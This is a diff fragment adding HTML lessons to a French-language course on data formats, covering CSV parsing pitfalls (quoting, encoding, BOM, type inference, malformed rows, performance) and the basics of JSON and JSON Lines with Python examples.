+        <li><strong>La structure est-elle fixe ou évolutive ?</strong> Un schéma stable et uniforme (CSV, Parquet) ou des champs optionnels/variables selon les enregistrements (JSON, XML) ?</li>
+        <li><strong>Quelles contraintes externes s'imposent ?</strong> Une API tierce qui n'accepte que du JSON, un système legacy qui n'échange qu'en XML, une contrainte réglementaire imposant un format d'archivage particulier ?</li>
+      </ol>
+
+      <h3>Une grille de décision rapide</h3>
+      <table>
+        <tr><th>Contexte</th><th>Format probable</th></tr>
+        <tr><td>Export ponctuel pour un utilisateur métier, ouverture dans Excel</td><td>CSV</td></tr>
+        <tr><td>Échange entre API web modernes</td><td>JSON</td></tr>
+        <tr><td>Intégration avec un système legacy d'entreprise (SOAP, EDI)</td><td>XML</td></tr>
+        <tr><td>Stockage analytique de gros volumes, data lake</td><td>Parquet</td></tr>
+        <tr><td>Configuration lisible par un humain versionnée en Git</td><td>JSON ou YAML (hors périmètre de ce cours)</td></tr>
+      </table>
+
+      <p>Il est essentiel de retenir qu'un même pipeline de données utilise très souvent <strong>plusieurs formats à des étapes différentes</strong> — un fichier peut arriver en CSV d'un export manuel, être converti en JSON pour transiter entre microservices, puis être stocké en Parquet pour l'analytique de long terme (sujet développé au Module 7). Le choix de format n'est donc presque jamais une décision unique et globale, mais une série de décisions locales à chaque étape du pipeline.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Choisir un format par habitude ou par défaut de l'outil utilisé (Excel exporte en CSV, une API répond en JSON) sans jamais reconsidérer ce choix quand le contexte change — par exemple continuer à traiter des exports CSV de plusieurs Go alors que le volume aurait depuis longtemps justifié un passage à Parquet.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        En appliquant les cinq questions ci-dessus, déterminez le format le plus adapté pour : (1) un rapport mensuel de 200 lignes envoyé par email à un directeur commercial, (2) un flux d'événements de tracking utilisateur ingéré en temps réel à raison de 10 000 événements/seconde et stocké pour analyse ultérieure sur 2 ans.
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 02 · .CSV</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m2-l1" class="fmt-csv">
+      <span class="lesson-kicker"><span class="fmt-badge">.CSV</span>Module 2 · Leçon 1</span>
+      <h2>Anatomie d'un Fichier CSV</h2>
+
+      <p>CSV (Comma-Separated Values) est souvent perçu comme "le format le plus simple qui existe" — et c'est en partie vrai, mais cette simplicité apparente cache un nombre surprenant de règles non universellement respectées, ce qui fait de CSV l'un des formats les plus sources de bugs silencieux en pratique, précisément parce qu'il semble trop simple pour mériter une attention particulière.</p>
+
+      <p>Un fichier CSV, dans sa forme la plus basique, est une suite de lignes où chaque ligne représente un enregistrement, et où les valeurs de chaque enregistrement sont séparées par un <strong>délimiteur</strong> (la virgule par convention, d'où le nom, mais le point-virgule est très répandu en France et en Europe pour éviter le conflit avec la virgule décimale).</p>
+
+      <pre><code class="language-text">id,nom,ville,note
+1,Alice,Paris,8.5
+2,Bob,Lyon,7.2
+3,"Durand, Carla",Marseille,9.0</code></pre>
+
+      <h3>Le rôle des guillemets : échapper le délimiteur lui-même</h3>
+      <p>La troisième ligne de l'exemple ci-dessus illustre la règle la plus importante et la plus souvent mal implémentée de CSV : si une valeur contient elle-même le caractère délimiteur (une virgule dans un nom de famille composé), elle doit être entourée de guillemets doubles pour indiquer au parseur que cette virgule fait partie de la valeur et ne doit pas être interprétée comme un séparateur de colonnes. Un parseur CSV naïf qui se contente de faire un <code>split(",")</code> sur chaque ligne — une erreur extrêmement fréquente chez les développeurs qui "réinventent" un parseur CSV sans utiliser une librairie dédiée — cassera immédiatement sur cette ligne, produisant 5 colonnes au lieu de 4.</p>
+
+      <pre><code class="language-python">import csv
+
+# JAMAIS faire ceci pour parser du CSV :
+ligne = '3,"Durand, Carla",Marseille,9.0'
+print(ligne.split(","))
+# ['3', '"Durand', ' Carla"', 'Marseille', '9.0']  -- CASSÉ : 5 champs au lieu de 4
+
+# TOUJOURS utiliser un parseur dédié qui gère les guillemets :
+with open("exemple.csv", newline="", encoding="utf-8") as f:
+    lecteur = csv.reader(f)
+    for ligne in lecteur:
+        print(ligne)
+# ['3', 'Durand, Carla', 'Marseille', '9.0']  -- correct : 4 champs</code></pre>
+
+      <h3>Échapper un guillemet à l'intérieur d'une valeur déjà entre guillemets</h3>
+      <p>Si une valeur contient elle-même un guillemet double, la convention CSV (formalisée dans la RFC 4180) consiste à le doubler : <code>"Il a dit ""bonjour"""</code> représente la valeur <code>Il a dit "bonjour"</code>. C'est une règle simple mais quasi systématiquement source de bugs dans les implémentations CSV artisanales qui ne gèrent que le cas des virgules et oublient celui des guillemets imbriqués.</p>
+
+      <h3>L'absence de standard réellement universel</h3>
+      <p>Contrairement à JSON ou XML, CSV n'a pas de spécification unique et universellement respectée. La RFC 4180 propose un standard, mais de nombreux outils (Excel selon la langue système, certains ERP) s'en écartent sur des détails comme le délimiteur par défaut (virgule vs point-virgule), la présence ou non d'une ligne d'en-tête, ou la gestion des retours à la ligne à l'intérieur d'un champ entre guillemets. C'est la raison structurelle pour laquelle "CSV" recouvre en réalité une famille de formats légèrement incompatibles entre eux plutôt qu'un format unique.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Écrire son propre parseur CSV avec un simple <code>split()</code> sur la virgule, en pensant que "c'est juste des valeurs séparées par des virgules". Cette approche fonctionne sur des exemples de démonstration simples et casse silencieusement (sans erreur visible, juste un décalage de colonnes) dès qu'une valeur réelle contient une virgule, un guillemet, ou un retour à la ligne. Utilisez toujours une librairie CSV dédiée (le module <code>csv</code> de Python, pandas, ou équivalent).
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un collègue vous montre son parseur CSV maison basé sur <code>ligne.split(",")</code> qui fonctionne parfaitement sur son jeu de test. Quelles trois valeurs de test spécifiques ajouteriez-vous à son jeu de test pour révéler les failles de son approche avant qu'elle n'atteigne la production ?
+      </div>
+    </section>
+
+    <section id="m2-l2" class="fmt-csv">
+      <span class="lesson-kicker"><span class="fmt-badge">.CSV</span>Module 2 · Leçon 2</span>
+      <h2>Le Piège de l'Encodage : UTF-8, BOM et Latin-1</h2>
+
+      <p>L'un des bugs les plus fréquents et les plus déroutants rencontrés avec des fichiers CSV en production n'a rien à voir avec la structure du format lui-même, mais avec l'<strong>encodage de caractères</strong> utilisé pour convertir le texte en octets sur le disque — un problème invisible tant que le fichier ne contient que des caractères ASCII de base (lettres non accentuées, chiffres), et qui surgit brutalement dès qu'apparaissent des accents, des caractères spéciaux, ou des symboles monétaires.</p>
+
+      <h3>UTF-8 : le standard moderne, mais pas toujours celui utilisé</h3>
+      <p>UTF-8 est aujourd'hui l'encodage recommandé par défaut pour tout nouveau fichier, capable de représenter n'importe quel caractère Unicode (tous les alphabets, emojis, symboles). Le problème est que de nombreux systèmes plus anciens ou des exports Excel sur des postes configurés en français utilisent encore <strong>Latin-1</strong> (ISO-8859-1) ou <strong>Windows-1252</strong>, deux encodages qui représentent les caractères accentués différemment d'UTF-8.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+# Erreur classique : lire un fichier Latin-1 en supposant UTF-8
+try:
+    df = pd.read_csv("export_excel_fr.csv", encoding="utf-8")
+except UnicodeDecodeError as e:
+    print(f"Erreur : {e}")
+    # 'utf-8' codec can't decode byte 0xe9 in position ... : invalid continuation byte
+
+# Solution : préciser l'encodage réel du fichier
+df = pd.read_csv("export_excel_fr.csv", encoding="latin-1")
+# ou, si l'encodage exact est inconnu, le détecter avec une librairie dédiée :
+import chardet
+with open("export_excel_fr.csv", "rb") as f:
+    resultat = chardet.detect(f.read())
+    print(resultat)  # {'encoding': 'ISO-8859-1', 'confidence': 0.73, ...}</code></pre>
+
+      <h3>Le piège silencieux : le mojibake</h3>
+      <p>Le cas le plus insidieux n'est pas l'erreur explicite (<code>UnicodeDecodeError</code>), mais le cas où un fichier Latin-1 est lu comme UTF-8 (ou l'inverse) <strong>sans provoquer d'erreur</strong>, produisant du texte corrompu et illisible appelé "mojibake" — par exemple, "café" devient "cafÃ©". Le fichier se charge sans avertissement, et le problème n'est découvert que visuellement ou beaucoup plus tard, quand une jointure ou une recherche textuelle échoue silencieusement car les chaînes ne correspondent plus caractère par caractère.</p>
+
+      <h3>Le BOM (Byte Order Mark) : un piège spécifique à Excel</h3>
+      <p>Excel, lorsqu'il exporte un fichier "CSV UTF-8", ajoute souvent en tout début de fichier une séquence invisible de 3 octets appelée BOM (<code>EF BB BF</code>), destinée à signaler explicitement l'encodage UTF-8 aux logiciels qui le lisent. Le problème : de nombreux parseurs ne reconnaissent pas ce BOM et l'incluent par erreur comme faisant partie du <em>premier nom de colonne</em>, ce qui casse silencieusement toute référence à cette colonne par son nom.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.read_csv("export_excel.csv")
+print(df.columns.tolist())
+# ['﻿id', 'nom', 'ville']  -- le BOM s'est glissé dans le nom de la première colonne !
+print(df["id"])  # KeyError: 'id' -- alors que la colonne existe bel et bien
+
+# Solution : utiliser l'encodage "utf-8-sig", qui détecte et retire le BOM automatiquement
+df = pd.read_csv("export_excel.csv", encoding="utf-8-sig")
+print(df.columns.tolist())  # ['id', 'nom', 'ville'] -- correct</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Déboguer un <code>KeyError</code> sur une colonne dont le nom semble pourtant correct visuellement dans un éditeur de texte. Le BOM invisible ou des espaces invisibles en début de nom de colonne sont des causes fréquentes de ce type d'erreur — inspectez toujours <code>repr(df.columns.tolist())</code> plutôt que le simple affichage visuel, qui masque les caractères invisibles.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un pipeline de production échoue une fois par mois avec une <code>UnicodeDecodeError</code>, uniquement quand certains fournisseurs envoient leur export mensuel. Sachant que l'encodage n'est jamais garanti par ces fournisseurs externes, quelle stratégie de lecture robuste mettriez-vous en place pour éviter cette panne récurrente ?
+      </div>
+    </section>
+
+    <section id="m2-l3" class="fmt-csv">
+      <span class="lesson-kicker"><span class="fmt-badge">.CSV</span>Module 2 · Leçon 3</span>
+      <h2>Le Typage Fantôme : Tout est une Chaîne de Caractères</h2>
+
+      <p>C'est une propriété fondamentale et souvent oubliée de CSV : le format ne connaît <strong>aucun type de données</strong>. Chaque valeur, qu'elle représente un entier, un nombre décimal, une date, un booléen ou du texte, est stockée exactement de la même façon — comme une séquence de caractères. C'est l'outil qui lit le fichier qui doit <em>deviner</em> le type réel de chaque colonne, et cette inférence est une source constante d'erreurs subtiles.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.read_csv("clients.csv")
+print(df.dtypes)
+# id            int64      -- pandas a deviné correctement
+# code_postal   int64      -- ATTENTION : perd les zéros en tête ! "01000" devient 1000
+# date_inscription  object -- reste une chaîne, pandas ne devine PAS les dates par défaut
+# actif         object     -- "oui"/"non" en texte, pas un vrai booléen</code></pre>
+
+      <h3>Le piège classique des codes postaux et identifiants avec zéros en tête</h3>
+      <p>Un code postal français comme "01000" (Bourg-en-Bresse) ou "08000" (Charleville-Mézières), lu comme un CSV sans précaution, est souvent interprété comme un entier — perdant silencieusement le zéro en tête pour devenir <code>1000</code> ou <code>8000</code>, une valeur syntaxiquement valide mais sémantiquement fausse. Le même problème touche les numéros de téléphone, certains identifiants clients, ou des codes SIRET.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+# Forcer explicitement le type "chaîne" pour préserver les zéros en tête
+df = pd.read_csv("clients.csv", dtype={"code_postal": str})
+print(df["code_postal"].head())
+# 0    01000
+# 1    75001
+# ...  -- zéros en tête préservés</code></pre>
+
+      <h3>Les dates : jamais un type natif en CSV</h3>
+      <p>Aucun format de date n'est imposé par CSV — une même colonne "date" peut contenir "2024-01-15", "15/01/2024", "Jan 15, 2024" ou "20240115" selon le système qui a généré le fichier, et rien dans le format lui-même ne signale quelle convention est utilisée. Pandas peut tenter de deviner et parser automatiquement les dates, mais cette inférence automatique est fragile (elle peut confondre le format jour/mois/année avec mois/jour/année selon les données présentes) et doit toujours être vérifiée explicitement.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.read_csv("commandes.csv", parse_dates=["date_commande"])
+print(df["date_commande"].dtype)  # datetime64[ns] si le parsing a réussi
+
+# Vérification indispensable : le format a-t-il été interprété correctement ?
+print(df["date_commande"].head())
+# Si une date "03/04/2024" est interprétée comme le 3 avril au lieu du 4 mars (ou l'inverse),
+# c'est un bug silencieux qui ne provoque aucune erreur mais fausse toute analyse temporelle</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Faire confiance à l'inférence automatique de types de pandas (<code>read_csv</code> sans spécifier <code>dtype</code>) sur des colonnes sensibles comme les identifiants, codes postaux, ou numéros de téléphone. Toujours vérifier explicitement <code>df.dtypes</code> après le chargement et forcer les types via le paramètre <code>dtype</code> pour toute colonne où la perte d'information (zéros en tête) ou une mauvaise interprétation (dates ambiguës) aurait des conséquences.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un fichier CSV contient une colonne "score" avec les valeurs "8.5", "9", "N/A", "7.2". Que va probablement produire pandas comme type de colonne par défaut, et quelle stratégie utiliseriez-vous pour obtenir une colonne numérique propre où "N/A" devient une valeur manquante correctement typée ?
+      </div>
+    </section>
+
+    <section id="m2-l4" class="fmt-csv">
+      <span class="lesson-kicker"><span class="fmt-badge">.CSV</span>Module 2 · Leçon 4</span>
+      <h2>CSV Malformés et Cas Limites</h2>
+
+      <p>Au-delà des pièges d'encodage et de typage déjà vus, les fichiers CSV réels — en particulier ceux générés par des systèmes tiers, des exports manuels, ou des systèmes legacy — présentent fréquemment des malformations structurelles qu'un parseur robuste doit savoir détecter et gérer, plutôt que d'échouer brutalement ou pire, de continuer silencieusement avec des données corrompues.</p>
+
+      <h3>Retours à la ligne à l'intérieur d'un champ</h3>
+      <p>Un champ texte entre guillemets peut légalement contenir un retour à la ligne (par exemple, une adresse postale multi-lignes ou un commentaire libre) — ce qui signifie qu'un enregistrement CSV peut s'étaler sur plusieurs lignes physiques du fichier. Un parseur naïf qui traite "une ligne physique = un enregistrement" cassera sur ce cas, alors qu'un parseur conforme à la RFC 4180 le gère correctement.</p>
+
+      <pre><code class="language-text">id,nom,adresse
+1,Alice,"12 rue de la Paix
+75002 Paris"
+2,Bob,"5 avenue Foch, Lyon"</code></pre>
+
+      <h3>Nombre de colonnes incohérent d'une ligne à l'autre</h3>
+      <p>Rien dans le format CSV n'empêche techniquement une ligne d'avoir plus ou moins de colonnes que les autres — un champ optionnel omis en fin de ligne, un délimiteur mal échappé, ou une ligne tronquée par une erreur d'export produisent tous ce symptôme. La bonne pratique est de configurer explicitement le comportement du parseur face à ce cas (lever une erreur, ignorer la ligne, ou la compléter avec des valeurs manquantes) plutôt que de laisser un comportement par défaut silencieux et potentiellement incohérent.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+# on_bad_lines permet de contrôler explicitement le comportement face aux lignes malformées
+df = pd.read_csv("fichier_suspect.csv", on_bad_lines="warn")   # avertit et ignore la ligne
+# df = pd.read_csv("fichier_suspect.csv", on_bad_lines="skip") # ignore silencieusement
+# df = pd.read_csv("fichier_suspect.csv", on_bad_lines="error") # comportement par défaut : erreur</code></pre>
+
+      <h3>Lignes vides, lignes de commentaire, et pieds de page parasites</h3>
+      <p>Certains exports incluent des lignes vides en fin de fichier, des lignes de commentaire commençant par un caractère spécial (<code>#</code>), ou même un résumé/total en dernière ligne qui n'est pas un enregistrement mais une agrégation — si ce dernier cas n'est pas explicitement filtré, il sera silencieusement inclus comme une ligne de données valide, faussant toute statistique calculée ensuite (une ligne "TOTAL,,,15420.50" comptée comme un enregistrement client dans un calcul de moyenne, par exemple).</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.read_csv("export_avec_total.csv", skipfooter=1, engine="python")  # ignore la dernière ligne
+# Toujours vérifier visuellement les dernières lignes d'un nouvel export avant traitement automatisé :
+print(pd.read_csv("export_avec_total.csv").tail(3))</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Traiter automatiquement un nouveau fichier CSV fourni par un système ou un partenaire externe sans jamais l'inspecter visuellement au préalable (premières et dernières lignes, nombre de colonnes par ligne). Une ligne de total, un en-tête décalé, ou un pied de page peuvent silencieusement s'intégrer aux données et fausser toute analyse en aval sans provoquer d'erreur visible.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un pipeline automatisé calcule chaque mois une moyenne de chiffre d'affaires par client à partir d'un export CSV, et cette moyenne semble anormalement élevée depuis 3 mois. En investiguant, vous découvrez que l'export contient désormais une ligne "TOTAL GÉNÉRAL" ajoutée par un nouveau système d'export. Proposez une vérification systématique à ajouter au pipeline pour détecter ce type de problème à l'avenir, avant qu'il n'affecte un résultat.
+      </div>
+    </section>
+
+    <section id="m2-l5" class="fmt-csv">
+      <span class="lesson-kicker"><span class="fmt-badge">.CSV</span>Module 2 · Leçon 5</span>
+      <h2>Lire et Écrire des CSV Performants en Python</h2>
+
+      <p>Cette leçon de synthèse pratique compare les principales approches Python pour manipuler des fichiers CSV, avec un regard particulier sur la performance à mesure que le volume de données augmente — un aspect souvent ignoré tant que les fichiers testés en développement restent petits.</p>
+
+      <h3>Le module <code>csv</code> natif : contrôle fin, faible mémoire</h3>
+      <pre><code class="language-python">import csv
+
+# Lecture ligne par ligne : consommation mémoire minimale, adapté aux très gros fichiers
+with open("gros_fichier.csv", newline="", encoding="utf-8") as f:
+    lecteur = csv.DictReader(f)  # chaque ligne devient un dict {colonne: valeur}
+    for ligne in lecteur:
+        if float(ligne["montant"]) > 1000:
+            print(ligne["id"], ligne["montant"])
+# Aucun DataFrame n'est jamais chargé en mémoire entièrement -- idéal pour un simple filtrage séquentiel</code></pre>
+
+      <h3>Pandas : confort d'analyse, coût mémoire plus élevé</h3>
+      <pre><code class="language-python">import pandas as pd
+
+# pandas charge tout le fichier en mémoire par défaut -- rapide à écrire, mais limité par la RAM
+df = pd.read_csv("gros_fichier.csv", dtype={"code_postal": str}, parse_dates=["date"])
+resultat = df[df["montant"] > 1000]
+
+# Pour des fichiers trop gros pour la RAM disponible : lecture par morceaux (chunking)
+resultats = []
+for morceau in pd.read_csv("gros_fichier.csv", chunksize=100_000):
+    resultats.append(morceau[morceau["montant"] > 1000])
+df_filtre = pd.concat(resultats, ignore_index=True)</code></pre>
+
+      <h3>PyArrow : le choix le plus performant pour de gros volumes</h3>
+      <pre><code class="language-python">import pyarrow.csv as pv
+
+# PyArrow lit le CSV avec un moteur en C++ multi-threadé, nettement plus rapide que pandas seul
+table = pv.read_csv("gros_fichier.csv")
+df = table.to_pandas()  # conversion finale en DataFrame pandas si nécessaire pour l'analyse</code></pre>
+
+      <h3>Écriture : les options qui évitent les problèmes vus dans ce module</h3>
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.DataFrame({"id": [1, 2], "code_postal": ["01000", "75001"], "nom": ["Durand, Alice", "Bob"]})
+
+df.to_csv(
+    "sortie.csv",
+    index=False,              # ne pas écrire l'index pandas comme colonne parasite
+    encoding="utf-8-sig",     # BOM inclus pour compatibilité Excel (leçon 2)
+    quoting=1,                # csv.QUOTE_ALL -- force les guillemets sur toutes les valeurs texte
+)
+# quoting=1 est une protection utile : même si une valeur ne contient pas de virgule aujourd'hui,
+# elle pourrait en contenir demain -- systématiser les guillemets évite un bug futur silencieux</code></pre>
+
+      <h3>Choisir son approche selon le contexte</h3>
+      <table>
+        <tr><th>Outil</th><th>Cas d'usage recommandé</th></tr>
+        <tr><td>Module <code>csv</code> natif</td><td>Traitement séquentiel simple, très gros fichiers, mémoire limitée</td></tr>
+        <tr><td>Pandas</td><td>Analyse exploratoire, transformations complexes, fichiers de taille modérée (jusqu'à quelques Go selon la RAM)</td></tr>
+        <tr><td>PyArrow</td><td>Gros volumes où la vitesse de lecture pure est critique, interopérabilité avec Parquet</td></tr>
+      </table>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Charger un fichier CSV de plusieurs Go entièrement en mémoire avec pandas par réflexe, sans envisager le chunking ou PyArrow, puis rencontrer une <code>MemoryError</code> en production sur une machine avec moins de RAM que le poste de développement. Toujours dimensionner l'approche de lecture en fonction de la taille réelle attendue des fichiers en production, pas seulement des fichiers de test.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous devez traiter quotidiennement un export CSV de 15 Go sur un serveur disposant de 8 Go de RAM, pour n'en extraire que les lignes correspondant à un critère simple (un statut particulier). Parmi les trois approches présentées dans cette leçon, laquelle choisiriez-vous, et pourquoi les deux autres ne conviennent pas dans ce contexte précis ?
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 03 · .JSON</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m3-l1" class="fmt-json">
+      <span class="lesson-kicker"><span class="fmt-badge">.JSON</span>Module 3 · Leçon 1</span>
+      <h2>Anatomie de JSON</h2>
+
+      <p>JSON (JavaScript Object Notation) s'est imposé comme le format d'échange dominant du web moderne — la quasi-totalité des API REST l'utilisent par défaut. Contrairement à CSV, JSON possède une spécification formelle unique et universellement respectée (normalisée sous ECMA-404 et RFC 8259), ce qui élimine la plupart des ambiguïtés d'interprétation vues au Module 2.</p>
+
+      <p>JSON ne repose que sur six types fondamentaux, qui se combinent pour représenter n'importe quelle structure de données :</p>
+      <ul>
+        <li><strong>string</strong> : texte entre guillemets doubles (jamais simples, contrairement à Python)</li>
+        <li><strong>number</strong> : un seul type numérique (pas de distinction entier/décimal au niveau du format lui-même)</li>
+        <li><strong>boolean</strong> : <code>true</code> ou <code>false</code> (en minuscules, contrairement à Python)</li>
+        <li><strong>null</strong> : l'absence explicite de valeur</li>
+        <li><strong>object</strong> : une collection non ordonnée de paires clé-valeur entre accolades <code>{}</code></li>
+        <li><strong>array</strong> : une liste ordonnée de valeurs entre crochets <code>[]</code></li>
+      </ul>
+
+      <pre><code class="language-json">{
+  "id": 42,
+  "nom": "Alice Martin",
+  "actif": true,
+  "date_derniere_connexion": null,
+  "score": 87.5,
+  "tags": ["premium", "beta-testeur"],
+  "adresse": {
+    "ville": "Lyon",
+    "code_postal": "69001"
+  }
+}</code></pre>
+
+      <h3>Ce que JSON ne représente PAS nativement</h3>
+      <p>Cette liste de six types, aussi élégante soit-elle par sa simplicité, a une conséquence pratique importante : de nombreux types de données courants n'ont <strong>aucune représentation native</strong> en JSON et doivent être encodés par convention, propre à chaque application :</p>
+      <ul>
+        <li><strong>Dates et heures</strong> : toujours encodées comme une chaîne (généralement ISO 8601, <code>"2024-03-15T14:30:00Z"</code>), jamais un type natif — c'est l'application qui doit savoir qu'un champ "chaîne" représente en réalité une date et la parser en conséquence.</li>
+        <li><strong>Nombres décimaux de précision arbitraire</strong> : le type <code>number</code> unique de JSON est généralement interprété comme un flottant double précision (IEEE 754) par la plupart des parseurs, ce qui peut introduire des imprécisions sur des montants financiers nécessitant une précision décimale exacte.</li>
+        <li><strong>Entiers très grands</strong> : un identifiant sur 64 bits peut dépasser la précision entière exacte représentable par un flottant double précision (au-delà de 2^53), provoquant une perte de précision silencieuse dans certains langages, notamment JavaScript.</li>
+        <li><strong>Types binaires</strong> : une image ou un fichier binaire doit être encodé en base64 (une chaîne de caractères), gonflant sa taille d'environ 33%.</li>
+      </ul>
+
+      <pre><code class="language-python">import json
+
+# Piège de précision : un très grand entier peut être corrompu selon le langage cible
+donnees = {"id_64bits": 9007199254740993}  # dépasse 2^53
+print(json.dumps(donnees))
+# En Python, json préserve la précision -- mais un client JavaScript qui parse ce JSON
+# via JSON.parse() peut silencieusement arrondir cette valeur à 9007199254740992</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Transmettre des identifiants numériques sur 64 bits (souvent utilisés par Twitter/X, Discord, ou des systèmes de sharding de base de données) en tant que type <code>number</code> JSON plutôt qu'en chaîne de caractères. Un client JavaScript qui consomme cette API peut silencieusement perdre en précision sur ces identifiants, provoquant des bugs de correspondance d'ID quasiment impossibles à reproduire de façon systématique. La convention recommandée est d'encoder ces identifiants comme des chaînes.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous concevez une API qui retourne des montants financiers en JSON. Pourquoi le type <code>number</code> natif de JSON est-il risqué pour représenter un montant en euros avec centimes, et quelles sont les deux conventions alternatives que vous pourriez adopter pour éviter tout problème d'arrondi ?
+      </div>
+    </section>
+
+    <section id="m3-l2" class="fmt-json">
+      <span class="lesson-kicker"><span class="fmt-badge">.JSON</span>Module 3 · Leçon 2</span>
+      <h2>JSON Lines (NDJSON) : le Format pour les Gros Volumes</h2>
+
+      <p>Le JSON standard présente une limite structurelle majeure pour le traitement de gros volumes de données : un document JSON complet doit être <strong>entièrement chargé en mémoire et parsé d'un seul bloc</strong> avant de pouvoir accéder à la moindre valeur, car la syntaxe (accolades et crochets imbriqués) n'est valide que dans son ensemble. Impossible de lire "juste la première moitié" d'un tableau JSON de 10 millions d'éléments sans avoir chargé le document entier.</p>
+
+      <p><strong>JSON Lines</strong> (aussi appelé NDJSON, Newline-Delimited JSON) résout ce problème avec une convention simple : chaque ligne du fichier est un objet JSON complet et indépendant, séparé du suivant par un simple retour à la ligne — pas de tableau englobant, pas de virgules entre les enregistrements.</p>
+
+      <pre><code class="language-text">{"id": 1, "nom": "Alice", "montant": 45.20}
+{"id": 2, "nom": "Bob", "montant": 12.90}
+{"id": 3, "nom": "Carla", "montant": 78.50}</code></pre>
+
+      <h3>Pourquoi cette contrainte change tout pour le traitement à grande échelle</h3>
+      <p>Parce que chaque ligne est indépendante et auto-suffisante, un programme peut traiter le fichier <strong>ligne par ligne en streaming</strong>, sans jamais charger l'intégralité du fichier en mémoire — un enregistrement corrompu sur une ligne n'empêche pas non plus de traiter correctement toutes les autres lignes (contrairement à un JSON standard où une syntaxe cassée n'importe où invalide le document entier). C'est pour cette raison que JSON Lines est le format de facto pour les logs applicatifs, les exports de bases de données NoSQL, et les jeux de données volumineux utilisés en machine learning.</p>
+
+      <pre><code class="language-python">import json
+
+# Écriture en streaming : chaque enregistrement écrit indépendamment
+with open("evenements.jsonl", "w", encoding="utf-8") as f:
+    for evenement in flux_evenements:   # génère potentiellement des millions d'événements
+        f.write(json.dumps(evenement) + "\n")
+
+# Lecture en streaming : jamais tout le fichier en mémoire simultanément
+with open("evenements.jsonl", encoding="utf-8") as f:
+    for ligne in f:
+        evenement = json.loads(ligne)
+        if evenement["type"] == "erreur":
+            print(evenement)</code></pre>
+
+      <h3>Le piège de confondre JSON et JSON Lines</h3>
+      <p>Un fichier JSON Lines n'est <strong>pas</strong> un document JSON valide dans son ensemble — essayer de le parser avec un simple <code>json.load()</code> échouera, car la syntaxe attend un unique objet ou tableau racine, pas plusieurs objets juxtaposés sans séparateur de tableau. Inversement, un tableau JSON classique ne peut pas être traité ligne par ligne de façon fiable, car un même enregistrement peut être formaté sur plusieurs lignes physiques selon l'indentation utilisée.</p>
+
+      <pre><code class="language-python">import json
+
+# ERREUR fréquente : essayer de charger un .jsonl comme du JSON classique
+try:
+    with open("evenements.jsonl") as f:
+        data = json.load(f)  # échoue : plusieurs objets JSON à la racine, syntaxe invalide
+except json.JSONDecodeError as e:
+    print(f"Erreur : {e}")  # Extra data: line 2 column 1</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Recevoir un fichier avec l'extension <code>.json</code> qui est en réalité formaté en JSON Lines (ou l'inverse), simplement parce que l'extension de fichier ne garantit jamais le format réel de son contenu. Toujours vérifier la structure réelle du fichier (un objet englobant unique vs plusieurs lignes indépendantes) avant de choisir la méthode de parsing, en particulier avec des fichiers reçus de systèmes externes.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un système de logs applicatif génère un fichier de 50 Go par jour. Pourquoi le format JSON Lines est-il structurellement plus adapté qu'un tableau JSON classique pour ce cas d'usage, en particulier si un processus de monitoring doit pouvoir lire les nouvelles lignes au fur et à mesure qu'elles sont écrites (streaming en quasi temps réel) ?
+      </div>
+    </section>
+
+    <section id="m3-l3" class="fmt-json">
+      <span class="lesson-kicker"><span class="fmt-badge">.JSON</span>Module 3 · Leçon 3</span>
+      <h2>Structures Imbriquées : Normaliser ou Dénormaliser ?</h2>
+
+      <p>La capacité de JSON à imbriquer des objets et des tableaux à n'importe quelle profondeur est à la fois sa plus grande force expressive et sa principale source de complexité au moment de l'exploiter dans un contexte tabulaire (DataFrame, table SQL). Cette leçon aborde le choix central entre conserver cette structure imbriquée ou l'aplatir.</p>
+
+      <pre><code class="language-json">{
+  "commande_id": 1001,
+  "client": {
+    "id": 42,
+    "nom": "Alice Martin"
+  },
+  "articles": [
+    {"produit": "Clavier", "quantite": 1, "prix_unitaire": 45.00},
+    {"produit": "Souris", "quantite": 2, "prix_unitaire": 15.00}
+  ]
+}</code></pre>
+
+      <h3>Dénormaliser : aplatir vers une structure tabulaire</h3>
+      <p>Aplatir consiste à transformer cette structure imbriquée en une ou plusieurs tables plates exploitables par des outils d'analyse tabulaires classiques (pandas, SQL). Le défi principal est que l'objet <code>client</code> (une relation "un-à-un") et le tableau <code>articles</code> (une relation "un-à-plusieurs") doivent être traités différemment.</p>
+
+      <pre><code class="language-python">import pandas as pd
+import json
+
+commande = json.load(open("commande.json"))
+
+# json_normalize aplatit automatiquement les objets imbriqués en colonnes préfixées
+df_commande = pd.json_normalize(commande, sep="_")
+print(df_commande.columns.tolist())
+# ['commande_id', 'client_id', 'client_nom', 'articles']
+# -- notez que "articles" (un tableau) n'est PAS aplati automatiquement, contrairement à "client" (un objet)
+
